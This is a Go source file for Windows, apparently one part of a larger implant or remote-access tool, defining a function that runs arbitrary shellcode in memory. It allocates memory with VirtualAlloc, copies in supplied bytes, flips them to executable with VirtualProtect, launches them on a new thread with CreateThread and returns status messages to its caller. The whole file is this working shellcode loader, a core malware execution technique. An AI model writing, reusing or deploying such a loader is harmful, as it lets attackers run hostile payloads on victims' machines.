//go:build windows

package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

var (
	pCreateThread  = kernel32.NewProc("CreateThread")
	pWaitForSingle = kernel32.NewProc("WaitForSingleObject")
)

const (
	INFINITE = 0xFFFFFFFF
)

func executeShellcode(data []byte) string {
	if len(data) == 0 {
		return "Error: empty shellcode"
	}

	addr, _, err := pVirtualAlloc.Call(
		0,
		uintptr(len(data)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		return fmt.Sprintf("Error: VirtualAlloc failed: %v", err)
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	var oldProtect uint32
	pVirtualProtect.Call(addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	var threadID uint32
	thread, _, err := pCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if thread == 0 {
		pVirtualFree.Call(addr, 0, MEM_RELEASE)
		return fmt.Sprintf("Error: CreateThread failed: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(thread))

	ret, _, _ := pWaitForSingle.Call(thread, uintptr(30*time.Second/time.Millisecond))
	if ret == 0x00000102 { // WAIT_TIMEOUT
		return "Shellcode executing (thread still running after 30s)"
	}

	pVirtualFree.Call(addr, 0, MEM_RELEASE)
	return fmt.Sprintf("Shellcode executed (%d bytes)", len(data))
}
